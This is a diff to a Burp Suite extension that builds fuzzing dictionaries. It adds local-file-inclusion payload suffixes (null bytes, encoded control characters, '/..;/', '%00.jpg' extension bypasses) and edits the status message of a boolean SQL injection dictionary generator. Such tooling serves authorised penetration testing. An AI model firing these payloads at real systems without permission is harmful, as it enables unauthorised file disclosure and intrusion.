@@ -657,6 +657,24 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
                 if "\\" in self._txtDictParam.text: 
                     listLFI.append(_resultTxt + self._txtDictParam.text + "\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20index.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09index.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0Dindex.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FFindex.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0D\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FF\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "/..;/\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20.jpg\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09.jpg\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0D.jpg\n")
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FF.jpg\n")
 
             counter = counter + 1
 
@@ -702,7 +720,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listSQLi.sort(reverse=True)
 
         self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
-        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' result.') 
+        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' records.') 
         return
 
     def getTabCaption(self):
